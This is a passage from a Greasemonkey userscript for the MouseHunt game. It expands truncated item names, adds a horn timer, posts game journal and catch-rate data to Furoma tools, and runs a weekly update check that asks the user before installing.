	if (this_trap == 'obelisk of slum..')
		return 'obelisk of slumber';
	if (this_trap == 'horrific venus...')
		return 'horrific venus mouse trap';
	if (this_trap == 'gingerbread hou...')
		return 'gingerbread house surprise';
		
	return this_trap;	

}



/*
Fix base.
@since 0.2
@params this_base -> base to be fixed
*/
function fix_base(this_base){

	if (this_base == 'firecracker bas...')
		return 'firecracker base';
	if (this_base == 'birthday cake b...')
		return 'birthday cake base';
	if (this_base == 'wooden base wit...')
		return 'wooden base with target';
	if (this_base == 'dehydration bas...')
		return 'dehydration base';
	if (this_base == 'gingerbread bas...')
		return 'gingerbread base';
		
	return this_base;	

}
	
	



/*
Fix location.
@since 0.2.3
@params this_location -> location to be fixed
*/
function fix_location(this_location){

	if (this_location == 'pinnacle chambe...')
		return 'pinnacle chamber';
	if (this_location == 'training ground...')
		return 'training grounds';
	if (this_location == 's.s. huntington...')
		return 's.s. huntington ii';
	if (this_location == 'great gnarled t...')
		return 'great gnarled tree';
		
	return this_location;	

}








/*
Initialize.
@since 0.1
@params none
*/
function init(){

	//Add the necessary CSS files
	add_mhizer_css();

	if(is_mh_page()){		
		create_timer_box();	
	}

	else if(is_fb_page()){
		if(timer_otherpages == "enable")
			create_timer_box();	
	}
		
	//Do not remove ads or MHize links on furoma.com pages
	if(!is_furoma_page()){
		remove_facebook_ads();
		
		
		if(mhize_links == "enable")
			mh_links_tooltip();
	}
		
	
	//Resets timer on clicking the horn timer icon.
	$('.hornbutton a').click(function(){
		clearTimeout(timeout);
		time_page_load = null;
		
		//Deprecated as of v0.2
		//horn_seconds_left = 900;		
		//timeout = setTimeout(set_timer_box, 1500); //Give the AJAX 1.5 seconds to complete before restarting the timer.
		$('#mh_min').html('Will reset in 5 seconds');
		setTimeout(reset_timer_value, 5000); //Reset timer after 5 seconds
		
		
	});
	
	
	//Auto-extracts journal pages from MH and adds to Summarizer/Parser
	if(autopost_journals=="enable"  && ( is_summarizer_page() || is_parser_page() ) ){ 
		get_page(1);
		get_page(2);
		get_page(3);
		
		the_timeout = setTimeout(get_all_pages, 2000);
	}
	
	//Adds Furoma Tools links to the MH menu if enabled.
	if( add_ft_links=="enable" && is_mh_page() )
		add_furoma_links();
		
	//Shows exact title % completion if enabled.
	if( show_percentage=="enable" && is_mh_page() )
		show_title_percent();
		
	//Add save function on config page
	if( is_config_page() )
		save_mhizer_options();
		
	//Added as of v0.2. Adds auto-post to catch rates page if enabled.				
	if(is_catch_rates_page() && autopost_tools=="enable"){
		
		$('#cre_column1 .block_content').prepend('<input type="button" id="mhizer_autopost" class="button-primary" value="MHizer - AutoPost data" /><br /><br />');
		$('#cre_column2 .block_content').prepend('<br /><br />');
		
		$('#mhizer_autopost').click(function(){
			to_catch_rates();
		});
	
	}
	
	

}

$(document).ready(function(){
	//Call init function
	init();	
	//Check for update every 7 days
	default_check_for_updates();
});


/*******************************************
* 			UPGRADES, META ETC
*******************************************/

var mhizer_update_param='mhizer_lastupdate';
var last_update_check = GM_getValue(mhizer_update_param, "never");

//Register Menu Commands
GM_registerMenuCommand("MouseHuntizer Options", open_config_page);
GM_registerMenuCommand("MouseHuntizer - Check for Updates", check_for_updates);

/*
Open Config Page.
@since 0.1
@params none
*/
function open_config_page(){	
	GM_openInTab(config_url);
}		

/*
Check for Updates
@since 0.1
@params none
*/
function check_for_updates(){	
	
	GM_xmlhttpRequest({
				method: 'GET',
				url: version_holder +'?rand='+Math.random(),
				headers: {
						'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
						'Content-type':'application/x-www-form-urlencoded',
				}, 
				onload: function(response_xhr){
					var response_html = String(response_xhr.responseText);
					var posn = response_html.indexOf('version=');
					posn = posn + 8; //8=> 'version='.length
					var latest_version = response_html.substring(posn);
					if(latest_version != null){
						if(mhizer_version != latest_version && latest_version != "undefined"){
						
							if(confirm("A more recent version of the MHizer (v" + latest_version + ") has been found.\r\nWould you like to get it now?")){							
								var today_date = new Date();
								GM_setValue(mhizer_update_param, String(today_date));
								window.location.href = source_location;
								
							}
							else
								ask_for_reminder();
						
						}
						
						else{
								var today = new Date();
								var one_day = 24 * 60 * 60 * 1000; //One day in milliseconds
								var interval=0;
								
								if(last_update_check != "never"){
									today = today.getTime(); //Get today's date
									var last_update_time = new Date(last_update_check).getTime();
									interval = (today - last_update_time) / one_day; //Find out how much days have passed										
									alert("Update Check - You have the latest version of the MHizer.");
								}	
								
											
									
								var today_date = new Date();
								GM_setValue(mhizer_update_param, String(today_date));
						}
					}
					else{
						alert("Couldn't locate the version holder! Please report this to Rohan, rohan[at]furoma.com");
					}
				}
							
		
	});
}	

/*
Ask for reminder
@since 0.1
@params none
*/
function ask_for_reminder(){	

	if(confirm("Would you like to be reminded in 24 hours ?\r\n(Cancel to be reminded after 7 days)")){
		var today = new Date();
		today = today.getTime();		
		var sixdays_ms = 6 * 24 * 60 * 60 * 1000;
		var sda_ms = today - sixdays_ms;		
		var sixdaysago = new Date(sda_ms)

		//Since we check for updates after 7 days, just make it seem like the last check was 6 days ago.
		GM_setValue(mhizer_update_param, String(sixdaysago));
	}
	else
		skip_weekly_check();
	
}


/*
Skip weekly update check
@since 0.1
@params none
*/
function skip_weekly_check(){
	var today = new Date();
	//As if we've just updated the script, the next check will only be next week.
	GM_setValue(mhizer_update_param, String(today));
}		

/*
Check for updates every 7 days.
@since 0.1
@params none
*/	
function default_check_for_updates(){

	var today = new Date();
	var one_day = 24 * 60 * 60 * 1000; //One day in milliseconds
	var interval=0;
	
	if(last_update_check != "never"){
		today = today.getTime(); //Get today's date
		var last_update_time = new Date(last_update_check).getTime();
		interval = (today - last_update_time) / one_day; //Find out how much days have passed	
	}
	else
		check_for_updates();
	
	
	
	if(interval >= 7)			
			check_for_updates();
}